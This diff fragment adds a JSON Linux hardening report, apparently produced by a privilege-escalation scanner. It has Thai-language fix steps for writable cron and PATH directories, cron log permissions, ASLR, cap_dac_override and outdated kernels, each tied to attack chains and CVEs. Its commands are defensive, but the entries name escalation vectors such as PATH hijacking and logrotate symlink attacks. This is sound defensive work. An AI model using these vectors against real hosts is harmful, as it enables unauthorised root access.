+                "# \u0e2b\u0e32 cron script \u0e17\u0e35\u0e48\u0e40\u0e02\u0e35\u0e22\u0e19\u0e44\u0e14\u0e49",
+                "find /etc/cron* /var/spool/cron -type f -perm -o+w 2>/dev/null",
+                "# \u0e41\u0e01\u0e49\u0e44\u0e02 permission",
+                "chmod 750 <script_path>",
+                "chown root:root <script_path>",
+                "# \u0e15\u0e23\u0e27\u0e08\u0e2a\u0e2d\u0e1a cron job \u0e17\u0e31\u0e49\u0e07\u0e2b\u0e21\u0e14\u0e17\u0e35\u0e48\u0e23\u0e31\u0e19\u0e40\u0e1b\u0e47\u0e19 root",
+                "crontab -l && for u in $(cut -f1 -d: /etc/passwd); do crontab -u $u -l 2>/dev/null && echo \"--- $u ---\"; done"
+            ],
+            "verify": "find /etc/cron* -perm -o+w 2>/dev/null  # \u0e15\u0e49\u0e2d\u0e07\u0e44\u0e21\u0e48\u0e21\u0e35 output",
+            "breaks_chains": [
+                "CHAIN-002",
+                "CHAIN-001"
+            ],
+            "trigger_score": 7.3,
+            "trigger_finding": "CVE-2017-9525"
+        },
+        {
+            "key": "path_writable_dir",
+            "title": "\u0e41\u0e01\u0e49\u0e44\u0e02 Permission \u0e02\u0e2d\u0e07 PATH Directory",
+            "description_th": "PATH directory \u0e17\u0e35\u0e48\u0e40\u0e02\u0e35\u0e22\u0e19\u0e44\u0e14\u0e49\u0e40\u0e1b\u0e34\u0e14\u0e0a\u0e48\u0e2d\u0e07\u0e43\u0e2b\u0e49 hijack command \u0e17\u0e35\u0e48\u0e23\u0e31\u0e19\u0e42\u0e14\u0e22 cron \u0e2b\u0e23\u0e37\u0e2d SUID binary",
+            "effort": "LOW",
+            "impact": "CRITICAL",
+            "timeline": "immediate",
+            "commands": [
+                "# \u0e2b\u0e32 directory \u0e43\u0e19 PATH \u0e17\u0e35\u0e48\u0e40\u0e02\u0e35\u0e22\u0e19\u0e44\u0e14\u0e49",
+                "for p in $(echo $PATH | tr ':' '\\n'); do ls -ld $p 2>/dev/null; done | grep -E '^d.......w'",
+                "# \u0e41\u0e01\u0e49\u0e44\u0e02 permission",
+                "chmod o-w <writable_path_dir>",
+                "chown root:root <writable_path_dir>",
+                "# \u0e15\u0e23\u0e27\u0e08\u0e2a\u0e2d\u0e1a\u0e27\u0e48\u0e32 PATH \u0e44\u0e21\u0e48\u0e21\u0e35 relative entry",
+                "echo $PATH | tr ':' '\\n' | grep -E '^\\.' "
+            ],
+            "verify": "for p in $(echo $PATH | tr ':' '\\n'); do ls -ld $p; done | grep -v '^drwxr-xr-x'",
+            "breaks_chains": [
+                "CHAIN-002"
+            ],
+            "trigger_score": 0.8,
+            "trigger_finding": ""
+        },
+        {
+            "key": "cron_log_writable",
+            "title": "\u0e41\u0e01\u0e49\u0e44\u0e02 Permission \u0e02\u0e2d\u0e07 Cron Log Directory",
+            "description_th": "Log directory \u0e17\u0e35\u0e48\u0e40\u0e02\u0e35\u0e22\u0e19\u0e44\u0e14\u0e49\u0e42\u0e14\u0e22\u0e17\u0e38\u0e01\u0e04\u0e19\u0e40\u0e1b\u0e34\u0e14\u0e0a\u0e48\u0e2d\u0e07\u0e17\u0e32\u0e07 symlink attack \u0e1c\u0e48\u0e32\u0e19 logrotate",
+            "effort": "LOW",
+            "impact": "HIGH",
+            "timeline": "immediate",
+            "commands": [
+                "chmod 755 /var/log/cron",
+                "chown root:adm /var/log/cron",
+                "# \u0e15\u0e23\u0e27\u0e08\u0e2a\u0e2d\u0e1a logrotate config",
+                "grep -r 'create' /etc/logrotate.d/cron"
+            ],
+            "verify": "ls -ld /var/log/cron  # \u0e15\u0e49\u0e2d\u0e07\u0e40\u0e2b\u0e47\u0e19 drwxr-xr-x",
+            "breaks_chains": [
+                "CHAIN-001"
+            ],
+            "trigger_score": 7.3,
+            "trigger_finding": "CVE-2017-9525"
+        },
+        {
+            "key": "aslr_disabled",
+            "title": "\u0e40\u0e1b\u0e34\u0e14\u0e43\u0e0a\u0e49\u0e07\u0e32\u0e19 ASLR",
+            "description_th": "ASLR \u0e17\u0e35\u0e48\u0e1b\u0e34\u0e14\u0e17\u0e33\u0e43\u0e2b\u0e49 exploit kernel \u0e41\u0e25\u0e30 heap \u0e07\u0e48\u0e32\u0e22\u0e02\u0e36\u0e49\u0e19\u0e21\u0e32\u0e01 \u0e40\u0e1b\u0e34\u0e14\u0e44\u0e14\u0e49\u0e17\u0e31\u0e19\u0e17\u0e35\u0e42\u0e14\u0e22\u0e44\u0e21\u0e48\u0e15\u0e49\u0e2d\u0e07 reboot",
+            "effort": "LOW",
+            "impact": "HIGH",
+            "timeline": "immediate",
+            "commands": [
+                "# \u0e40\u0e1b\u0e34\u0e14 ASLR \u0e17\u0e31\u0e19\u0e17\u0e35 (\u0e44\u0e21\u0e48\u0e15\u0e49\u0e2d\u0e07 reboot)",
+                "sysctl -w kernel.randomize_va_space=2",
+                "# \u0e17\u0e33\u0e43\u0e2b\u0e49\u0e16\u0e32\u0e27\u0e23",
+                "echo 'kernel.randomize_va_space = 2' >> /etc/sysctl.conf",
+                "sysctl -p"
+            ],
+            "verify": "cat /proc/sys/kernel/randomize_va_space  # \u0e15\u0e49\u0e2d\u0e07\u0e40\u0e1b\u0e47\u0e19 2",
+            "breaks_chains": [
+                "CHAIN-005"
+            ],
+            "trigger_score": 8.6,
+            "trigger_finding": "CVE-2016-5195"
+        },
+        {
+            "key": "cap_dac_override",
+            "title": "\u0e25\u0e1a cap_dac_override \u0e41\u0e25\u0e30\u0e43\u0e0a\u0e49 ACL \u0e41\u0e17\u0e19",
+            "description_th": "cap_dac_override \u0e02\u0e49\u0e32\u0e21\u0e17\u0e38\u0e01 permission check \u0e04\u0e27\u0e23\u0e43\u0e0a\u0e49 ACL \u0e17\u0e35\u0e48\u0e40\u0e09\u0e1e\u0e32\u0e30\u0e40\u0e08\u0e32\u0e30\u0e08\u0e07\u0e41\u0e17\u0e19",
+            "effort": "MEDIUM",
+            "impact": "HIGH",
+            "timeline": "week1",
+            "commands": [
+                "setcap -r <binary_path>",
+                "# \u0e43\u0e0a\u0e49 ACL \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e43\u0e2b\u0e49\u0e2a\u0e34\u0e17\u0e18\u0e34\u0e4c\u0e40\u0e09\u0e1e\u0e32\u0e30\u0e44\u0e1f\u0e25\u0e4c\u0e17\u0e35\u0e48\u0e15\u0e49\u0e2d\u0e07\u0e01\u0e32\u0e23\u0e41\u0e17\u0e19",
+                "setfacl -m u:<service_user>:r /path/to/specific/file",
+                "# \u0e25\u0e47\u0e2d\u0e04\u0e44\u0e1f\u0e25\u0e4c sensitive \u0e14\u0e49\u0e27\u0e22 immutable flag",
+                "chattr +i /etc/passwd /etc/shadow /etc/sudoers"
+            ],
+            "verify": "lsattr /etc/passwd | grep -i immutable",
+            "breaks_chains": [
+                "CHAIN-007"
+            ],
+            "trigger_score": 8.8,
+            "trigger_finding": "/usr/bin/perl"
+        },
+        {
+            "key": "kernel_outdated",
+            "title": "\u0e2d\u0e31\u0e1b\u0e40\u0e14\u0e15 Kernel \u0e40\u0e1b\u0e47\u0e19\u0e40\u0e27\u0e2d\u0e23\u0e4c\u0e0a\u0e31\u0e19\u0e25\u0e48\u0e32\u0e2a\u0e38\u0e14",
+            "description_th": "Kernel \u0e17\u0e35\u0e48\u0e21\u0e35\u0e0a\u0e48\u0e2d\u0e07\u0e42\u0e2b\u0e27\u0e48\u0e15\u0e49\u0e2d\u0e07\u0e2d\u0e31\u0e1b\u0e40\u0e14\u0e15\u0e17\u0e31\u0e19\u0e17\u0e35 \u0e16\u0e49\u0e32 reboot \u0e44\u0e21\u0e48\u0e44\u0e14\u0e49\u0e43\u0e2b\u0e49\u0e43\u0e0a\u0e49 kpatch",
+            "effort": "HIGH",
+            "impact": "CRITICAL",
+            "timeline": "week2",
+            "commands": [
+                "# Ubuntu/Debian",
+                "apt update && apt upgrade linux-image-$(uname -r)",
+                "# RHEL/CentOS",
+                "yum update kernel",
+                "# \u0e15\u0e23\u0e27\u0e08\u0e2a\u0e2d\u0e1a\u0e40\u0e27\u0e2d\u0e23\u0e4c\u0e0a\u0e31\u0e19\u0e2b\u0e25\u0e31\u0e07 reboot",
+                "uname -r",
+                "# \u0e16\u0e49\u0e32 reboot \u0e44\u0e21\u0e48\u0e44\u0e14\u0e49 \u0e43\u0e0a\u0e49 kpatch (kernel live patching)",
+                "kpatch list"
+            ],
+            "verify": "uname -r  # \u0e15\u0e23\u0e27\u0e08\u0e2a\u0e2d\u0e1a\u0e27\u0e48\u0e32\u0e40\u0e1b\u0e47\u0e19 version \u0e43\u0e2b\u0e21\u0e48",
+            "breaks_chains": [
+                "CHAIN-005"
+            ],
+            "trigger_score": 8.6,
+            "trigger_finding": "CVE-2016-5195"
+        }
+    ],
+    "context_factors": {
+        "aslr": {
+            "active": false,
+            "weight": 0.0,
+            "label_th": "ASLR \u0e40\u0e1b\u0e34\u0e14\u0e1b\u0e01\u0e15\u0e34"
+        },
+        "sudo_access": {
+            "active": false,
+            "weight": 0.0,
+            "label_th": "\u0e44\u0e21\u0e48\u0e1e\u0e1a\u0e2a\u0e34\u0e17\u0e18\u0e34\u0e4c sudo"
+        },
+        "mac_enforcement": {
+            "active": true,
+            "weight": 0.5,
+            "label_th": "\u0e44\u0e21\u0e48\u0e21\u0e35 SELinux/AppArmor \u0e04\u0e27\u0e32\u0e21\u0e40\u0e2a\u0e35\u0e48\u0e22\u0e07\u0e2a\u0e39\u0e07\u0e02\u0e36\u0e49\u0e19"
+        },
+        "dangerous_groups": {
+            "active": false,
+            "weight": 0.0,
+            "label_th": "\u0e44\u0e21\u0e48\u0e2d\u0e22\u0e39\u0e48\u0e43\u0e19 group \u0e2d\u0e31\u0e19\u0e15\u0e23\u0e32\u0e22"
+        },
+        "writable_sensitive": {
+            "active": false,
+            "weight": 0.0,
+            "label_th": "\u0e44\u0e21\u0e48\u0e21\u0e35\u0e44\u0e1f\u0e25\u0e4c\u0e2a\u0e33\u0e04\u0e31\u0e0d\u0e17\u0e35\u0e48\u0e40\u0e02\u0e35\u0e22\u0e19\u0e44\u0e14\u0e49"
+        },
+        "container": {
+            "active": false,
+            "weight": 0.0,
+            "label_th": "\u0e44\u0e21\u0e48\u0e44\u0e14\u0e49\u0e2d\u0e22\u0e39\u0e48\u0e43\u0e19 container"
+        },
+        "ptrace_scope": {
+            "active": false,
+            "weight": 0.0,
+            "label_th": "ptrace \u0e08\u0e33\u0e01\u0e31\u0e14\u0e40\u0e09\u0e1e\u0e32\u0e30 parent process"
+        },
+        "core_dumps": {
+            "active": true,
+            "weight": 0.3,
+            "label_th": "Core dump \u0e40\u0e1b\u0e34\u0e14\u0e2d\u0e22\u0e39\u0e48 \u0e2d\u0e32\u0e08 leak \u0e02\u0e49\u0e2d\u0e21\u0e39\u0e25 sensitive \u0e08\u0e32\u0e01 memory"
+        }
+    }
+}
